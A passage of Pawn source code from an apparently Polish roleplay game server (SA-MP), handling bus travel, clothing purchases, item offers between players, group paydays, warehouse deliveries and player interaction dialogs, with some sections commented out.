						PlayerTextDrawShow(playerid, RadarTextDraw[playerid]);
						return 1;
					}
				}
			}
		}
		pVal[playerid] = -1;
	}
	else if(lr == KEY_LEFT)
	{
		for(new i=pVal[playerid]-1; i>-1; i--)
		{
			if(ObjectCache[i][oState] == 0)
			{
				if(ObjectCache[i][oModel] == 1257)
				{
					if(!IsPlayerInRangeOfPoint(playerid, 5.0, ObjectCache[i][oX], ObjectCache[i][oY], ObjectCache[i][oZ]))
					{
						SetPlayerCameraPos(playerid, ObjectCache[i][oX], ObjectCache[i][oY], ObjectCache[i][oZ]+300);
						SetPlayerCameraLookAt(playerid, ObjectCache[i][oX], ObjectCache[i][oY], ObjectCache[i][oZ], CAMERA_MOVE);
						pVal[playerid] = i;
						new Float:num = PlayerCache[uid][pPosX]+ObjectCache[i][oX] - PlayerCache[uid][pPosY]+ObjectCache[i][oY];
						new time = floatround(num);
						time*=30;
						new str[64];
						if(time/1000/2 >= 0)
						format(str, sizeof(str), "Przystanek: %s~n~Koszt: ~g~~h~$%d", DeleteSomething(ObjectCache[i][oName]), time/1000/2);
						else
						format(str, sizeof(str), "Przystanek: %s~n~Koszt: ~g~~h~$%d", DeleteSomething(ObjectCache[i][oName]), (time/1000/2)*-1);
						PlayerTextDrawSetString(playerid, RadarTextDraw[playerid], str);
						PlayerTextDrawShow(playerid, RadarTextDraw[playerid]);
						return 1;
					}
				}
			}
		}
		pVal[playerid] = MAX_OBJECTS;
	}
	else if(keys & KEY_SECONDARY_ATTACK)
	{
		new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
		PlayerCache[uid][pPosX] = X;
		PlayerCache[uid][pPosY] = Y;
		PlayerCache[uid][pPosZ] = Z;
		new oouid = pVal[playerid];
		new Float:num = PlayerCache[uid][pPosX]+ObjectCache[oouid][oX] - PlayerCache[uid][pPosY]+ObjectCache[oouid][oY];
		new time = floatround(num);
		time*=30;
		if(PlayerCache[playerid][pCash] < time/1000/2)
		{
			new str[32]; format(str, sizeof(str), "Nie posiadasz ~r~~h~$%d.", time/1000/2);
			return TextDrawForPlayerEx(playerid, 1, str, 5000);
		}
		PlayerCache[playerid][pCash] -= time/1000/2;
		GivePlayerMoney(playerid, -time/1000/2);
		TogglePlayerSpectating(playerid, 1);
		InterpolateCameraPos(playerid, PlayerCache[uid][pPosX], PlayerCache[uid][pPosY], PlayerCache[uid][pPosZ]+100, ObjectCache[oouid][oX], ObjectCache[oouid][oY], ObjectCache[oouid][oZ]+100, time, CAMERA_MOVE);
		new str[64]; format(str, sizeof(str), "Poczekaj: ~b~~h~~h~~h~%ds", time/1000);
		PlayerTextDrawSetString(playerid, RadarTextDraw[playerid], str);
		PlayerTextDrawShow(playerid, RadarTextDraw[playerid]);
		SetTimerEx("Minus", 1000, false, "ii", playerid, time);
		KillTimer(BusTimer[playerid]);
		new msg[128]; format(msg, sizeof(msg), "* %s wsiada do busu nr. %d kieruj¹cego siê w stronê %s. *", RPName(playerid), random(100)+4000, DeleteSomething(ObjectCache[pVal[playerid]][oName]));
		SendPlayerMessageInRange(playerid, msg, ME_SHADE_1, ME_SHADE_2, ME_SHADE_3, ME_SHADE_4, ME_SHADE_5, ME_SHADE_6, false);
		pBus[playerid] = true;
	}
	else if(keys & KEY_JUMP)
	{
		KillTimer(BusTimer[playerid]);
		SetCameraBehindPlayer(playerid);
		PlayerTextDrawHide(playerid, RadarTextDraw[playerid]);
		TogglePlayerControllable(playerid, 1);
	}
	return 1;
}*/

forward Minus(playerid, time);
public Minus(playerid, time)
{
	time-=1000;
	new str[64]; format(str, sizeof(str), "Poczekaj: ~b~~h~~h~~h~%ds", time/1000);
	PlayerTextDrawSetString(playerid, RadarTextDraw[playerid], str);
	PlayerTextDrawShow(playerid, RadarTextDraw[playerid]);
	if(time <= 1000)
	{
		pBus[playerid] = false;
		TogglePlayerControllable(playerid, 1);
		TogglePlayerSpectating(playerid, 0);
		PlayerTextDrawHide(playerid, RadarTextDraw[playerid]);
		return SetPlayerPos(playerid, ObjectCache[pVal[playerid]][oX], ObjectCache[pVal[playerid]][oY], ObjectCache[pVal[playerid]][oZ]);
	}
	return SetTimerEx("Minus", 1000, false, "ii", playerid, time);
}

stock ShowDialogApp(playerid)
return ShowPlayerDialog(playerid, D_APP, DIALOG_STYLE_INPUT, "Telefon > Kontakty > Zadzwoñ do grupy", ""HEX_WHITE"Wpisz poni¿ej treœæ zg³oszenia:\n", "Wyœlij", "Anuluj");

forward DestroyIconZ(mapid);
public DestroyIconZ(mapid)
{
	DestroyDynamicMapIcon(mapid);
}

stock IsUserConnected(useruid)
{
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(PlayerCache[i][pUID] == useruid)
			return i;
		}
	}
	return -1;
}

stock GetActionName(action)
{
	new name[32];
	switch(action)
	{
		case 1: name = "Chce Ciebie poca³owaæ";
		case 2: name = "Chce Ciebie przytuliæ";
		case 3: name = "Chce podaæ Ci d³oñ";
	}
	return name;
}

stock GetGroupDoor(groupuid)
{
	for(new i; i<LastdUID; i++)
	{
		if(!DoorCache[i][dDestroyed])
		{
			if(DoorCache[i][dGroupUID] == groupuid)
			return i;
		}
	}
	return 0;
}

new pClotchesTimer[MAX_PLAYERS];


forward ClotchesTimer(playerid, guid);
public ClotchesTimer(playerid, guid)
{
	new keys, ud, lr, actual_item_uid = pVal[playerid];
	GetPlayerKeys(playerid, keys, ud, lr);
	new msg[256];
	if(keys & KEY_JUMP)
	{
		TogglePlayerControllable(playerid, 1);
		KillTimer(pClotchesTimer[playerid]);
		SetCameraBehindPlayer(playerid);
		PlayerTextDrawHide(playerid, BottomTextDraw[playerid]);
		SetPlayerSkin(playerid, PlayerCache[playerid][pSkin]);
	}
	if(lr == KEY_LEFT)
	{
		for(new i=actual_item_uid-1; i>=1; i--)
		{
			if(ItemCache[i][iState] == ITEM_STATE_PRODUCT)
			{
				if(ItemCache[i][iOwner] == guid)
				{
					pVal[playerid] = i;
					SetPlayerSkin(playerid, ItemCache[i][iVal]);
					format(msg, sizeof(msg), "Ubranie ~y~%d~n~~w~Koszt: ~g~~h~$%d~n~~n~~w~Wcisnij LPM by kupic~n~Wcisnij ENTER by anulowac",
					ItemCache[i][iVal], ItemCache[i][iCost]);
					PlayerTextDrawSetString(playerid, BottomTextDraw[playerid], msg);
					return PlayerTextDrawShow(playerid, BottomTextDraw[playerid]);
				}
			}
		}
	}
	if(lr == KEY_RIGHT)
	{
		for(new i=actual_item_uid+1; i<MAX_ITEMS; i++)
		{
			if(ItemCache[i][iState] == ITEM_STATE_PRODUCT)
			{
				if(ItemCache[i][iOwner] == guid)
				{
					pVal[playerid] = i;
					SetPlayerSkin(playerid, ItemCache[i][iVal]);
					format(msg, sizeof(msg), "Ubranie ~y~%d~n~~w~Koszt: ~g~~h~$%d~n~~n~~w~Wcisnij LPM by kupic~n~Wcisnij ENTER by anulowac",
					ItemCache[i][iVal], ItemCache[i][iCost]);
					PlayerTextDrawSetString(playerid, BottomTextDraw[playerid], msg);
					return PlayerTextDrawShow(playerid, BottomTextDraw[playerid]);
				}
			}
		}
	}
	if(keys & KEY_SECONDARY_ATTACK)
	{
		if(PlayerCache[playerid][pCash] < ItemCache[actual_item_uid][iCost])
		{
			format(msg, sizeof(msg), "Nie posiadasz ~g~$%d~w~ aby kupic ten przedmiot.", ItemCache[actual_item_uid][iCost]);
			return TextDrawForPlayerEx(playerid, 1, msg, 5000);
		}
		if(ItemCache[actual_item_uid][iVW] == 0)
		return TextDrawForPlayerEx(playerid, 1, "Produkt w magazynie skonczyl sie.", 3000);
		PlayerCache[playerid][pCash] -= ItemCache[actual_item_uid][iCost];
		GivePlayerMoney(playerid, -ItemCache[actual_item_uid][iCost]);
		ItemCache[actual_item_uid][iVW]--; // amount of items in bussines magazine not vw =_)
		GroupCache[guid][gBank] += ItemCache[actual_item_uid][iCost];
		format(msg, sizeof(msg), "Zakupiono przedmiot ~g~-$%d", ItemCache[actual_item_uid][iCost]);
		TogglePlayerControllable(playerid, 1);
		KillTimer(pClotchesTimer[playerid]);
		SetCameraBehindPlayer(playerid);
	/*	PlayerTextDrawHide(playerid, BottomTextDraw[playerid]);
		CreateItem(PlayerCache[playerid][pUID], ItemCache[actual_item_uid][iType], ItemCache[actual_item_uid][iVal], ItemCache[actual_item_uid][iVal2], ItemCache[actual_item_uid][iVal3],
		ItemCache[actual_item_uid][iVal4], ItemCache[actual_item_uid][iGroup], ItemCache[actual_item_uid][iName]);
		SetPlayerSkin(playerid, PlayerCache[playerid][pSkin]);
		return TextDrawForPlayerEx(playerid, 1, msg, 5000);*/
	}
	return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	if(strlen(inputtext) != 0)
	{
		for(new i=0; i<strlen(inputtext); i++)
		{
			if(inputtext[i] == '%')
			inputtext[i] = '#';
		}
	}
	switch(dialogid)
	{	
		case D_PLAYER_LOGS:{
			if(response){
				new logUID = 0, playerUID = 0;
				sscanf(inputtext, "ii", logUID, playerUID);
				if(logUID == -1){
					
					ShowPlayerLogs(playerid, LOG_TYPE_GAME_CHAT, playerUID);
					return 1;
				}
				new query[128];
				format(query, sizeof(query), "SELECT message, playerUID,type FROM playerLogs WHERE uid=%d LIMIT 1", logUID);
				new Cache:cache = mysql_query(DB_HANDLE,query);

				new fullMessage[128], type;
				cache_get_value_name(0, "message", fullMessage);
				cache_get_value_name_int(0, "playerUID", playerUID);
				cache_get_value_name_int(0, "type", type);

				
				new logInfo[256];
				format(logInfo,sizeof(logInfo), "%s", fullMessage);
				TextDrawForPlayer(playerid, 2, logInfo);

				cache_delete(cache);
				ShowPlayerLogs(playerid, LOG_TYPE_GAME_CHAT, playerUID);

			}else{
				HideTextDrawForPlayer(playerid, 2);
			}
		}
		case D_PLAYER_REPORTS:{
			if(response){
				new reportUID = 0;
				sscanf(inputtext, "i", reportUID);
			
				new query[256];
				format(query, sizeof(query), "SELECT receiverUID FROM playerReports WHERE uid = %d LIMIT 1;", reportUID);
				new Cache:cache = mysql_query(DB_HANDLE, query);
				new reportedPlayerUID;
				cache_get_value_name_int(0, "receiverUID", reportedPlayerUID);

				cache_delete(cache);

				if(reportUID == -1){
					ShowPlayerLogs(playerid, LOG_TYPE_GAME_CHAT, reportedPlayerUID);
					return 1;
				}
				

				ShowPlayerLogs(playerid, LOG_TYPE_GAME_CHAT, reportedPlayerUID);

			}
			else{

			}
			
		}
		case D_ACCEPT_ITEM:
		{
			new senderuid = tVal[playerid];
			new itemuid = tVal2[playerid];
			new msg[128]; format(msg, sizeof(msg), "%s odrzucil te oferte.", RPName(playerid));
			new senderid = IsUserConnected(senderuid);
			if(response)
			{

				if(senderid == -1)
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub wyszed³ z gry.");
				ItemCache[itemuid][iOwner] = PlayerCache[playerid][pUID];
				format(msg, sizeof(msg), "podaje jakiœ przedmiot %s.", RPName(playerid));
				SendPlayerMe(senderid, msg);
				GameTextForPlayer(senderid, "~y~oferta zaakceptowana", 3000, 4);
			}
			else
			{
				if(senderid != -1)
				GameTextForPlayer(senderid, msg, 3000, 4);
			}
		}
		case D_NEARBY_PLAYERS:
		{
			if(response)
			{
				new tid = IsUserConnected(strval(inputtext));
				if(tid == -1)
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub wyszed³ z gry.");
				new iuid = pVal[playerid];
				tVal[tid] = PlayerCache[playerid][pUID];
				tVal2[tid] = iuid;
				GameTextForPlayer(playerid, "~y~oferta wyslana", 3000, 4);
				new header[64]; format(header, sizeof(header), "Oferta od: %s (%d)", RPName(playerid), playerid);
				new info[128]; format(info, sizeof(info), "Gracz chce oddaæ Ci przedmiot %s za darmo.\nCzy akceptujesz jego ofertê?\n\nWybierz Tak lub Nie.",ItemCache[iuid][iName]);
				return ShowPlayerDialog(tid, D_ACCEPT_ITEM, DIALOG_STYLE_MSGBOX, header, info, "Tak", "Nie");
			}
		}
		case D_CLOTCHES:
		{
			if(response)
			{
				/*new duid = GetPlayerDoorUID(playerid);
				new guid = DoorCache[duid][dGroupUID];
				if(GroupCache[guid][gType] != 12)
				return SendClientMessage(playerid, COLOR_GRAY, "Nie znajdujesz siê w sklepie odzie¿owym.");
				switch(strval(inputtext))
				{
					case 1:
					{
						for(new i; i<MAX_ITEMS; i++)
						{
							if(ItemCache[i][iState] == ITEM_STATE_PRODUCT)
							{
								if(ItemCache[i][iOwner] == guid)
								{
									new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
									TogglePlayerControllable(playerid, 0);
									SetPlayerCameraPos(playerid, X+3, Y, Z);
									SetPlayerCameraLookAt(playerid, X, Y, Z);
									pClotchesTimer[playerid] = SetTimerEx("ClotchesTimer", 125, true, "ii", playerid, guid);
									SetPlayerSkin(playerid, ItemCache[i][iVal]);
									new msg[256]; format(msg, sizeof(msg), "Ubranie ~y~%d~n~~w~Koszt: ~g~~h~$%d~n~~n~~w~Wcisnij LPM by kupic~n~Wcisnij ENTER by anulowac",
									ItemCache[i][iVal], ItemCache[i][iCost]);
									PlayerTextDrawSetString(playerid, BottomTextDraw[playerid], msg);
									pVal[playerid] = i;
									return PlayerTextDrawShow(playerid, BottomTextDraw[playerid]);
								}
							}
						}
					}
					case 2:
					{
						return ShowDialogInfo(playerid, "Jutro zrobie xd");
					}
				}*/
			}
		}
		case D_MEMBER_PAYDAY:
		{
			if(response)
			{
				/*new payday = strval(inputtext);
				if(payday < 60)
				{
					TextDrawForPlayerEx(playerid, 1, "Minimalnie mozesz ustawic $60 wyplaty.", 5000);
					return ShowDialogMemberPayDay(playerid);
				}
				new guid = pVal[playerid];
				if(GroupCache[guid][gType] != 1 && GroupCache[guid][gType] != 2 && GroupCache[guid][gType] != 16)
				{
					if(payday > 300)
					{
						TextDrawForPlayerEx(playerid, 1, "Maksymalna wyplata dla czlonka tej grupy to $300.", 5000);
						return ShowDialogMemberPayDay(playerid);
					}
				}
				else
				{
					if(payday > 600)
					{
						TextDrawForPlayerEx(playerid, 1, "Maksymalna wyplata dla czlonka tej grupy to $300.", 5000);
						return ShowDialogMemberPayDay(playerid);
					}
				}
				new muid = pVal2[playerid];
				if(PlayerCache[muid][pGroup] == guid)
				PlayerCache[muid][pGroupReward] = payday;
				else if(PlayerCache[muid][pGroup2] == guid)
				PlayerCache[muid][pGroupReward2] = payday;
				else if(PlayerCache[muid][pGroup3] == guid)
				PlayerCache[muid][pGroupReward3] = payday;
				new msg[64]; format(msg, sizeof(msg), "%s~n~Nowa wyplata: ~g~$%d", PlayerCache[muid][pName], payday);
				TextDrawForPlayerEx(playerid, 1, msg, 5000);
				return ShowDialogMemberPayDay(playerid);*/
			}
			return ShowDialogManageMember(playerid);
		}
		case D_GROUP_PAYDAY:
		{
			new guid = pVal[playerid];
			if(response)
			{
				new payday = strval(inputtext);
				if(payday < 60)
				{
					TextDrawForPlayerEx(playerid, 1, "Minimalnie mozesz ustawic $60 wyplaty.", 5000);
					return ShowDialogGroupPayDay(playerid);
				}
				if(GroupCache[guid][gType] != 1 && GroupCache[guid][gType] != 2 && GroupCache[guid][gType] != 16)
				{
					if(payday > 300)
					{
						TextDrawForPlayerEx(playerid, 1, "Maksymalna wyplata dla czlonka tej grupy to $300.", 5000);
						return ShowDialogGroupPayDay(playerid);
					}
					else
					{
						if(payday > 600)
						{
							TextDrawForPlayerEx(playerid, 1, "Maksymalna wyplata dla czlonka tej grupy to $600.", 5000);
							return ShowDialogGroupPayDay(playerid);
						}
					}
				}
				GroupCache[guid][gPayDay] = payday;
				new msg[64]; format(msg, sizeof(msg), "~w~wyplata ustawiona:~n~~b~$%d", payday);
				GameTextForPlayer(playerid, msg, 3000, 4);
			}
			return ShowDialogGroupOptions(playerid, guid);
		}
		case D_24:
		{
			if(response)
			{
			/*	new iuid = strval(inputtext);
				new price = ItemCache[iuid][iCost];
				if(PlayerCache[playerid][pCash] < price)
				return TextDrawForPlayerEx(playerid, 1, "~r~Nie posiadasz gotowki by zakupic ten produkt.", 3000);
				if(!ItemCache[iuid][iVW])
				return TextDrawForPlayerEx(playerid, 1, "Brak produktow w magazynie.", 3000);
				PlayerCache[playerid][pCash] -= price;
				GivePlayerMoney(playerid, -price);
				new str[128]; format(str, sizeof(str), "Zakupiono przedmiot ~g~%s.~n~~w~Przedmiot znajduje sie w Twoim ekwipunku pod ~y~/p.", ItemCache[iuid][iName]);
				TextDrawForPlayerEx(playerid, 1, str, 5000);
				ItemCache[iuid][iVW]--;
				new guid = ItemCache[iuid][iGroupSender];
				GroupCache[guid][gBank] += ItemCache[iuid][iCost];
				return CreateItem(PlayerCache[playerid][pUID], ItemCache[iuid][iType], ItemCache[iuid][iVal], ItemCache[iuid][iVal2], ItemCache[iuid][iVal3], ItemCache[iuid][iVal4],
				ItemCache[iuid][iGroup], ItemCache[iuid][iName]);*/
			}
		}
		case D_ACCEPT_GROUP_ITEM:
		{
			/*new senderuid = tVal2[playerid];
			new senderid = IsUserConnected(senderuid);
			new amount = tVal3[playerid];
			new str[128];
			format(str, sizeof(str), "~r~%s ~w~odrzucil te oferte.", RPName(playerid));

			if(response)
			{
				//if(senderid == -1)
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub wyszed³ z gry.");
				if(!IsPlayerInRangeOfPlayer(playerid, senderid, 5.0))
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz oddali³ siê.");

				new itemuid = tVal[playerid];
				new price = ItemCache[itemuid][iCost]*amount;

				if(PlayerCache[playerid][pCash] < price)
				return TextDrawForPlayerEx(playerid, 1, "Nie posiadasz przy sobie az tyle gotowki~n~by kupic ten przedmiot.", 5000);

				if(GetPlayerItemsCount(playerid)+amount > 20)
				return ShowDialogInfo(playerid, "Nie pomieœcisz tylu przedmiotów w ekwipunku.");

				ItemCache[itemuid][iVW]-=amount; // vw is count of items here, not the Virual World

				new groupuid = ItemCache[itemuid][iGroupSender];

				GroupCache[groupuid][gBank] += price*amount;

				PlayerCache[playerid][pCash] -= price*amount;

				GivePlayerMoney(playerid, -price);

				GameTextForPlayer(senderid, "~y~oferta zaakceptowana", 3000, 4);
				ApplyAnimation(senderid,"BAR","Barserve_bottle",4.1, 0, 0, 0, 0, 0);

				for(new i; i<=amount; i++)
				{
					CreateItem(PlayerCache[playerid][pUID], ItemCache[itemuid][iType], ItemCache[itemuid][iVal], ItemCache[itemuid][iVal2], ItemCache[itemuid][iVal3], ItemCache[itemuid][iVal4], ItemCache[itemuid][iGroup],
					strreplace(ItemCache[itemuid][iName], '_', ' '));
					ItemCache[MAX_ITEMS-1][iState] = ITEM_STATE_EQ;
					ItemCache[MAX_ITEMS-1][iGroupSender] = groupuid;
				}

				format(str, sizeof(str), "podaje przedmiot %s %s.", ItemCache[itemuid][iName], RPName(playerid));
				return SendPlayerMe(senderid, str);
			}
			else
			{
				if(senderid != -1)
				{
					TextDrawForPlayerEx(senderid, 1, str, 5000);
				}
				TextDrawForPlayerEx(playerid, 1, "Odrzucono oferte.", 5000);
			}
		}
		case D_GROUP_AMOUNT_ITEM:
		{
			if(response)
			{
				new targetuid = pVal[playerid];
				new amount = strval(inputtext);
				new iuid = pVal2[playerid];

				new targetid = IsUserConnected(targetuid);
				if(targetid == -1)
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub wyszed³ z gry.");
				if(!IsPlayerInRangeOfPlayer(playerid, targetid, 5.0))
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz oddali³ siê.");

				if(ItemCache[iuid][iVW] == 0)
				return SendClientMessage(playerid, COLOR_GRAY, "Ten produkt w magazynie skoñczy³ siê.");

				if(amount == 0)
				{
					new info[128];
					format(info, sizeof(info), "Poni¿ej wpisz iloœæ produktu jak¹ chcesz podaæ %s.", RPName(targetid));
					return ShowPlayerDialog(playerid, D_GROUP_AMOUNT_ITEM, DIALOG_STYLE_INPUT, "Podaj iloœæ", info, "Wyœlij", "Anuluj");
				}

				if(ItemCache[iuid][iVW] < amount)
				return SendClientMessage(playerid, COLOR_GRAY, "Poprzednio podano iloœæ produktów do sprzedania temu graczowi, ale a¿ tylu nie ma w magazynie grupy.");

				GameTextForPlayer(playerid, "~y~oferta wyslana", 3000, 4);
				tVal[targetid] = iuid;
				tVal2[targetid] = PlayerCache[playerid][pUID];
				tVal3[targetid] = amount;

				new header[64], info[128]; format(header, sizeof(header), "Oferta od %s(%d).", RPName(targetid), targetid);

				format(info, sizeof(info), ""HEX_YELLOW"Zakup przedmiotu %s (x%d) za $%d\n\nCzy akceptujesz  tê ofertê??", ItemCache[iuid][iName], amount, ItemCache[iuid][iCost]*amount);

				return ShowPlayerDialog(targetid, D_ACCEPT_GROUP_ITEM, DIALOG_STYLE_MSGBOX, header, info, "Kup", "Anuluj");
			}*/
		}
		case D_GROUP_ITEMS:
		{
			if(response)
			{
				new targetuid = pVal[playerid];
				new amount = pVal2[playerid];

				new iuid = strval(inputtext);

				new targetid = IsUserConnected(targetuid);
				if(targetid == -1)
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub wyszed³ z gry.");
				if(!IsPlayerInRangeOfPlayer(playerid, targetid, 5.0))
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz oddali³ siê.");

				if(ItemCache[iuid][iVW] == 0)
				return SendClientMessage(playerid, COLOR_GRAY, "Ten produkt w magazynie skoñczy³ siê.");

				if(amount == 0)
				{
					pVal[playerid] = targetuid;
					pVal2[playerid] = iuid;
					new info[128];
					format(info, sizeof(info), "Poni¿ej wpisz iloœæ produktu jak¹ chcesz podaæ %s.", RPName(targetid));
					return ShowPlayerDialog(playerid, D_GROUP_AMOUNT_ITEM, DIALOG_STYLE_INPUT, "Podaj iloœæ", info, "Wyœlij", "Anuluj");
				}

				if(ItemCache[iuid][iVW] < amount)
				return SendClientMessage(playerid, COLOR_GRAY, "Poprzednio podano iloœæ produktów do sprzedania temu graczowi, ale a¿ tylu nie ma w magazynie grupy.");

				GameTextForPlayer(playerid, "~y~oferta wyslana", 3000, 4);
				tVal[targetid] = iuid;
				tVal2[targetid] = PlayerCache[playerid][pUID];
				tVal3[targetid] = amount;

				new header[64], info[128]; format(header, sizeof(header), "Oferta od %s(%d).", RPName(targetid), targetid);

				format(info, sizeof(info), ""HEX_YELLOW"Zakup przedmiotu %s (x%d) za $%d\n\nCzy akceptujesz  tê ofertê??", ItemCache[iuid][iName], amount, ItemCache[iuid][iCost]*amount);

				return ShowPlayerDialog(targetid, D_ACCEPT_GROUP_ITEM, DIALOG_STYLE_MSGBOX, header, info, "Kup", "Anuluj");
			}
		}
		case D_MAGAZINE:
		{
			if(response)
			{
				new itemuid = strval(inputtext);
				for(new i; i<MAX_ITEMS; i++)
				{
					if(ItemCache[i][iState] == ITEM_STATE_DRIVING)
					{
						if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
						return SendClientMessage(playerid, COLOR_GRAY, "Przewozisz ju¿ jak¹œ paczkê.");
					}
				}
				if(ItemCache[itemuid][iState] == ITEM_STATE_PRODUCT)
				return SendClientMessage(playerid, COLOR_GRAY, "Ta paczka zosta³a ju¿ dostarczona.");
				new msg[128];
				if(ItemCache[itemuid][iOwner])
				{
					format(msg, sizeof(msg), "%s ju¿ dostarcza tê paczkê.",  RPName(IsUserConnected(PlayerCache[ItemCache[itemuid][iOwner]][pUID])));
					return SendClientMessage(playerid, COLOR_GRAY, msg);
				}
				ItemCache[itemuid][iOwner] = PlayerCache[playerid][pUID];
				ItemCache[itemuid][iState] = ITEM_STATE_DRIVING;

				TextDrawForPlayerEx(playerid, 1, "~y~Magazyn ~w~zostal zaznaczony na radarze.~n~Gdy bedziesz w poblizu markeru uzyj ~y~/paczka~w~ by odebrac paczke.", 10000);

				pMapIcon[playerid] = CreateDynamicMapIcon(ServerSettings[magazinePosX],ServerSettings[magazinePosY], ServerSettings[magazinePosZ], 0, COLOR_DARKRED, 0, 0, playerid, 60000, MAPICON_GLOBAL_CHECKPOINT);
				return Streamer_Update(playerid);
			}
		}
		case D_CONFIRM_POS:
		{
			if(response)
			{
				GetPlayerPos(playerid, ServerSettings[magazinePosX], ServerSettings[magazinePosY], ServerSettings[magazinePosZ]);
				TextDrawForPlayerEx(playerid, 1, "Pozycja magazynu zostala zmieniona ~g~~h~~h~pomyslnie.", 5000);
				return ShowDialogServerSettings(playerid);
			}
		}
		case D_SERVER_SETTINGS:
		{
			if(response)
			{
				new option = strval(inputtext);
				switch(option)
				{
					case 1: return ShowPlayerDialog(playerid, D_CONFIRM_POS, DIALOG_STYLE_MSGBOX, "Zmieñ pozycjê magazynu", ""HEX_WHITE"Miejsce w, którym stoisz bêdzie aktualnym miejscem\nodbierania paczek z magazynu.\nCzy jesteœ pewien(na), ¿e chcesz wybraæ to miejsce w, którym aktualnie stoisz?", "Ustaw", "Anuluj");
				}
			}
		}
		case D_ACTION_OFFER:
		{
			new senderuid = tVal2[playerid];
			new senderid = IsUserConnected(senderuid);
			if(response)
			{
				if(senderid == -1)
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub wyszed³ z gry.");
				new option = tVal[playerid];
				new Float:tang; GetPlayerFacingAngle(senderid, tang);
				new Float:pang; GetPlayerFacingAngle(playerid, pang);
				switch(option)
				{
					case 1:
					{
						ApplyAnimation(playerid, "bd_fire", "Playa_Kiss_03", 4.1, 0, 0, 0, 0, 0);
						ApplyAnimation(senderid, "bd_fire", "Grlfrd_Kiss_03", 4.1, 0, 0, 0, 0, 0);
					}
					case 2:
					{
						ApplyAnimation(senderid, "kissing", "Playa_Kiss_02", 4.1, 0, 0, 0, 0, 0);
						ApplyAnimation(playerid, "kissing", "Playa_Kiss_02", 4.1, 0, 0, 0, 0, 0);
					}
					case 3:
					{
						ApplyAnimation(senderid, "GANGS", "prtial_hndshk_biz_01", 4.1, 0, 0, 0, 0, 0);
						ApplyAnimation(playerid, "GANGS", "prtial_hndshk_biz_01", 4.1, 0, 0, 0, 0, 0);
					}
				}
				GameTextForPlayer(senderid, "~y~oferta zaakceptowana", 3000, 4);
				GameTextForPlayer(playerid, "~y~oferta zaakceptowana", 3000, 4);
			}
			else
			{
				if(senderid != -1)
				{
					TextDrawForPlayerEx(playerid, 1, "Odrzucono oferte.", 3000);
					TextDrawForPlayerEx(senderid, 1, "Oferta zostala ~r~~h~odrzucona.", 3000);
				}
			}
		}
		case D_INTERRACT_PLAYER:
		{
			if(response)
			{
				
				new targetid = pVal[playerid];
				if(targetid == -1)
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz opuœci³ grê lub wylogowa³ siê.");
				if(!IsPlayerInRangeOfPlayer(playerid, targetid, 2.5))
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz oddali³ siê.");
				new option = strval(inputtext);
				if(option == 4)
				{
					if(PlayerCache[targetid][pBW_Time] == 0)
					return ShowDialogInfo(playerid, "Ten gracz nie ma statusu BW.");
					new bool:IsAnyMedicOnline;
					for(new i; i<=GetPlayerPoolSize(); i++)
					{
						if(IsPlayerConnected(i))
						{
							if(GroupCache[pDuty[i]][gType] == 2)
							{
								IsAnyMedicOnline=true;
								break;
							}
						}
					}
					if(IsAnyMedicOnline)
					return ShowDialogInfo(playerid, "Mo¿esz œci¹gn¹æ BW temu graczowi tylko wtedy, kiedy ¿aden medyk nie jest na s³u¿bie.");
					TogglePlayerControllable(targetid, 1);
					ClearAnimations(targetid);
					SetCameraBehindPlayer(targetid);
					PlayerCache[targetid][pBW_Time] = 0;
					UpdatePlayerName(targetid);
					PlayerTextDrawHide(targetid, BWTextDraw[targetid]);
					new msg[128]; format(msg, sizeof(msg), "%s pomóg³ Tobie odzyskaæ przytomnoœæ.\nOdegraj krótk¹ lub d³u¿sz¹ akcjê RolePlay z tym graczem.", RPName(playerid));
					return ShowDialogInfo(targetid, msg);
				}
				if(option == 5)
				{
					if(GroupCache[pDuty[playerid]][gType] == 1 || GroupCache[pDuty[playerid]][gType] == 16)
					{
						return CuffPlayer(playerid, targetid);
					}
					return ShowDialogInfo(playerid, "Nie znajdujesz siê na s³u¿bie odpowiedniej grupy.");
				}
				tVal[targetid] = option;
				tVal2[targetid] = PlayerCache[playerid][pUID];
				new header[64], message[64]; format(header, sizeof(header), "Oferta od: %s.", RPName(playerid));
				format(message, sizeof(message), ""HEX_WHITE"%s.\n\nCzy akceptujesz tê ofertê?", GetActionName(option));
				ShowPlayerDialog(targetid, D_ACTION_OFFER, DIALOG_STYLE_MSGBOX, header, message, "Akceptuj", "Odrzuæ");
				GameTextForPlayer(playerid, "~y~oferta wyslana", 3000, 4);
			}
		}
		case D_APPS:
		{
			/*if(response)
			{
				new app_id = strval(inputtext);
				new calleruid = AppCache[app_id][appPlayerUID];
				new callerid = -1;
				for(new i; i<=GetPlayerPoolSize(); i++)
				{
					if(IsPlayerConnected(i))
					{
						if(PlayerCache[i][pUID] == calleruid)
						{
							callerid = i;
						}
					}
				}
				if(callerid != -1)
				{
					new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y, Z);
					new id = CreateDynamicMapIcon(X, Y, Z, 0, COLOR_DARKRED, GetPlayerVirtualWorld(callerid), 0, callerid, 60000, MAPICON_GLOBAL_CHECKPOINT);
					SetTimerEx("DestroyIconZ", 60000*10, false, "i", id);
					new msg[256];
					if(PlayerCache[playerid][pGender])
					format(msg, sizeof(msg), "> %s odebra³a Twoje zg³oszenie. Na mapie zaznaczono miejsce z którego do Ciebie jedzie.", RPName(playerid));
					else
					format(msg, sizeof(msg), "> %s odebra³ Twoje zg³oszenie. Na mapie zaznaczono miejsce z którego do Ciebie jedzie.", RPName(playerid));
